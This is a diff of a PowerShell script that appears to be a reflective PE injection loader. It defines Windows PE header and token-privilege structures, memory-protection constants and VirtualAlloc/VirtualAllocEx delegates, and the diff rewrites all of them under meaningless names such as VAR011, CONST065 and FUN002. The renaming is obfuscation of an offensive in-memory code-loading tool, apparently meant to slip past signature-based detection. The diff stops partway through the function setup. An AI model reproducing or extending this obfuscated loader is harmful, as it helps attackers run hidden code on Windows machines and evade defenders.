+        ($VAR011.DefineField('Magic', $VAR021, 'Public')).SetOffset(0) | Out-Null
+        ($VAR011.DefineField('CONST065', [Byte], 'Public')).SetOffset(2) | Out-Null
+        ($VAR011.DefineField('CONST064', [Byte], 'Public')).SetOffset(3) | Out-Null
+        ($VAR011.DefineField('CONST063', [UInt32], 'Public')).SetOffset(4) | Out-Null
+        ($VAR011.DefineField('CONST062', [UInt32], 'Public')).SetOffset(8) | Out-Null
+        ($VAR011.DefineField('CONST061', [UInt32], 'Public')).SetOffset(12) | Out-Null
+        ($VAR011.DefineField('CONST060', [UInt32], 'Public')).SetOffset(16) | Out-Null
+        ($VAR011.DefineField('CONST059', [UInt32], 'Public')).SetOffset(20) | Out-Null
+        ($VAR011.DefineField('CONST119', [UInt32], 'Public')).SetOffset(24) | Out-Null
+        ($VAR011.DefineField('CONST058', [UInt32], 'Public')).SetOffset(28) | Out-Null
+        ($VAR011.DefineField('CONST057', [UInt32], 'Public')).SetOffset(32) | Out-Null
+        ($VAR011.DefineField('CONST056', [UInt32], 'Public')).SetOffset(36) | Out-Null
+        ($VAR011.DefineField('CONST055', [UInt16], 'Public')).SetOffset(40) | Out-Null
+        ($VAR011.DefineField('CONST054', [UInt16], 'Public')).SetOffset(42) | Out-Null
+        ($VAR011.DefineField('CONST053', [UInt16], 'Public')).SetOffset(44) | Out-Null
+        ($VAR011.DefineField('CONST052', [UInt16], 'Public')).SetOffset(46) | Out-Null
+        ($VAR011.DefineField('CONST051', [UInt16], 'Public')).SetOffset(48) | Out-Null
+        ($VAR011.DefineField('CONST050', [UInt16], 'Public')).SetOffset(50) | Out-Null
+        ($VAR011.DefineField('CONST049', [UInt32], 'Public')).SetOffset(52) | Out-Null
+        ($VAR011.DefineField('CONST033', [UInt32], 'Public')).SetOffset(56) | Out-Null
+        ($VAR011.DefineField('CONST034', [UInt32], 'Public')).SetOffset(60) | Out-Null
+        ($VAR011.DefineField('CONST048', [UInt32], 'Public')).SetOffset(64) | Out-Null
+        ($VAR011.DefineField('CONST047', $VAR017, 'Public')).SetOffset(68) | Out-Null
+        ($VAR011.DefineField('CONST035', $VAR018, 'Public')).SetOffset(70) | Out-Null
+        ($VAR011.DefineField('CONST046', [UInt32], 'Public')).SetOffset(72) | Out-Null
+        ($VAR011.DefineField('CONST045', [UInt32], 'Public')).SetOffset(76) | Out-Null
+        ($VAR011.DefineField('CONST044', [UInt32], 'Public')).SetOffset(80) | Out-Null
+        ($VAR011.DefineField('CONST043', [UInt32], 'Public')).SetOffset(84) | Out-Null
+        ($VAR011.DefineField('CONST105', [UInt32], 'Public')).SetOffset(88) | Out-Null
+        ($VAR011.DefineField('CONST106', [UInt32], 'Public')).SetOffset(92) | Out-Null
+        ($VAR011.DefineField('CONST107', $VAR020, 'Public')).SetOffset(96) | Out-Null
+        ($VAR011.DefineField('CONST108', $VAR020, 'Public')).SetOffset(104) | Out-Null
+        ($VAR011.DefineField('CONST109', $VAR020, 'Public')).SetOffset(112) | Out-Null
+        ($VAR011.DefineField('CONST110', $VAR020, 'Public')).SetOffset(120) | Out-Null
+        ($VAR011.DefineField('CONST111', $VAR020, 'Public')).SetOffset(128) | Out-Null
+        ($VAR011.DefineField('CONST112', $VAR020, 'Public')).SetOffset(136) | Out-Null
+        ($VAR011.DefineField('Debug', $VAR020, 'Public')).SetOffset(144) | Out-Null
+        ($VAR011.DefineField('Architecture', $VAR020, 'Public')).SetOffset(152) | Out-Null
+        ($VAR011.DefineField('CONST113', $VAR020, 'Public')).SetOffset(160) | Out-Null
+        ($VAR011.DefineField('CONST114', $VAR020, 'Public')).SetOffset(168) | Out-Null
+        ($VAR011.DefineField('CONST115', $VAR020, 'Public')).SetOffset(176) | Out-Null
+        ($VAR011.DefineField('CONST120', $VAR020, 'Public')).SetOffset(184) | Out-Null
+        ($VAR011.DefineField('IAT', $VAR020, 'Public')).SetOffset(192) | Out-Null
+        ($VAR011.DefineField('CONST116', $VAR020, 'Public')).SetOffset(200) | Out-Null
+        ($VAR011.DefineField('CONST117', $VAR020, 'Public')).SetOffset(208) | Out-Null
+        ($VAR011.DefineField('Reserved', $VAR020, 'Public')).SetOffset(216) | Out-Null
+            $VAR024 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST118 -Value $VAR024
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
-            $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
-            $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
-            $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST03164', $VAR019, [System.ValueType], 264)
+            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
+            $VAR011.DefineField('CONST122', $VAR023, 'Public') | Out-Null
+            $VAR025 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03164 -Value $VAR025
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
-            $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
-            $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
-            $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST03132', $VAR019, [System.ValueType], 248)
+            $VAR011.DefineField('Signature', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST121', $VAR022, 'Public') | Out-Null
+            $VAR011.DefineField('CONST122', $VAR024, 'Public') | Out-Null
+            $VAR026 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST03132 -Value $VAR026
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
-            $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST123', $VAR019, [System.ValueType], 64)
+            $VAR011.DefineField('CONST124', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST125', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST126', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST127', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST128', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST129', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST130', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST131', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST132', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST133', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST134', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST135', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST136', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST137', [UInt16], 'Public') | Out-Null
 
-            $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
-            $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
-            $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
-            $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
-            $e_resField.SetCustomAttribute($AttribBuilder)
+            $VAR027 = $VAR011.DefineField('CONST138', [UInt16[]], 'Public, HasFieldMarshal')
+            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+            $VAR029 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
+            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 4))
+            $VAR027.SetCustomAttribute($VAR030)
 
-            $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST139', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST140', [UInt16], 'Public') | Out-Null
 
-            $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
-            $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
-            $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
-            $e_res2Field.SetCustomAttribute($AttribBuilder)
+            $VAR031 = $VAR011.DefineField('CONST1382', [UInt16[]], 'Public, HasFieldMarshal')
+            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 10))
+            $VAR031.SetCustomAttribute($VAR030)
 
-            $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
-            $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
-
-            
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)
-
-            $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
-            $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
-            $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
-            $nameField.SetCustomAttribute($AttribBuilder)
-
-            $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
-            $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER
+            $VAR011.DefineField('CONST141', [Int32], 'Public') | Out-Null
+            $VAR032 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST123 -Value $VAR032
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
-            $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
-            $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST142', $VAR019, [System.ValueType], 40)
+
+            $VAR033 = $VAR011.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
+            $VAR028 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
+            $VAR030 = New-Object System.Reflection.Emit.CustomAttributeBuilder($VAR015, $VAR028, $VAR029, @([Int32] 8))
+            $VAR033.SetCustomAttribute($VAR030)
+
+            $VAR011.DefineField('CONST143', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST144', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST145', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST146', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST147', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST148', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST149', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
+            $VAR034 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST142 -Value $VAR034
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
-            $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
-            $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST150', $VAR019, [System.ValueType], 8)
+            $VAR011.DefineField('CONST074', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST151', [UInt32], 'Public') | Out-Null
+            $VAR035 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST150 -Value $VAR035
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
-            $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
-            $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
-            $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST152', $VAR019, [System.ValueType], 20)
+            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST153', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST154', [UInt32], 'Public') | Out-Null
+            $VAR036 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST152 -Value $VAR036
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
-            $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
-            $LUID = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST155', $VAR019, [System.ValueType], 40)
+            $VAR011.DefineField('CONST067', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST071', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST156', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('CONST157', [UInt16], 'Public') | Out-Null
+            $VAR011.DefineField('Name', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('Base', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST158', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST159', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST160', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST161', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST162', [UInt32], 'Public') | Out-Null
+            $VAR037 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST155 -Value $VAR037
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
-            $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
-            $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
-            $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST163', $VAR019, [System.ValueType], 8)
+            $VAR011.DefineField('CONST164', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST165', [UInt32], 'Public') | Out-Null
+            $VAR038 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST163 -Value $VAR038
 
             
-            $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-            $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
-            $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
-            $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
-            $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
-            $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST166', $VAR019, [System.ValueType], 12)
+            $VAR011.DefineField('CONST163', $VAR038, 'Public') | Out-Null
+            $VAR011.DefineField('Attributes', [UInt32], 'Public') | Out-Null
+            $VAR039 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST166 -Value $VAR039
 
-            return $Win32Types
+            
+            $VAR019 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+            $VAR011 = $VAR014.DefineType('CONST167', $VAR019, [System.ValueType], 16)
+            $VAR011.DefineField('CONST168', [UInt32], 'Public') | Out-Null
+            $VAR011.DefineField('CONST169', $VAR039, 'Public') | Out-Null
+            $VAR040 = $VAR011.CreateType()
+            $VAR010 | Add-Member -MemberType NoteProperty -Name CONST167 -Value $VAR040
+
+            return $VAR010
         }
 
-        Function Get-Win32Constants {
-            $Win32Constants = New-Object System.Object
+        Function FUN002 {
+            $VAR0041 = New-Object System.Object
 
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
-            $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST001 -Value 0x00001000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST002 -Value 0x00002000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST003 -Value 0x01
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST004 -Value 0x02
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST005 -Value 0x04
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST006 -Value 0x08
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST007 -Value 0x10
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST009 -Value 0x20
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST008 -Value 0x40
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST010 -Value 0x80
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST011 -Value 0x200
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST012 -Value 0
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST013 -Value 3
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST014 -Value 10
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST015 -Value 0x02000000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST016 -Value 0x20000000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST017 -Value 0x40000000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST018 -Value 0x80000000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST019 -Value 0x04000000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST020 -Value 0x4000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST021 -Value 0x0002
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST022 -Value 0x2000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST023 -Value 0x40
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST024 -Value 0x100
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST025 -Value 0x8000
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST026 -Value 0x0008
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST027 -Value 0x0020
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST028 -Value 0x2
+            $VAR0041 | Add-Member -MemberType NoteProperty -Name CONST029 -Value 0x3f0
 
-            return $Win32Constants
+            return $VAR0041
         }
 
-        Function Get-Win32Functions {
-            $Win32Functions = New-Object System.Object
+        Function FUN003 {
+            $VAR0042 = New-Object System.Object
 
-            $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
-            $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
-            $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
-            $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
+            $VAR0043 = FUN012 kernel32.dll VirtualAlloc
+            $VAR0044 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+            $VAR0045 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0043, $VAR0044)
+            $VAR0042 | Add-Member NoteProperty -Name FUN031 -Value $VAR0045
 
-            $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
-            $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
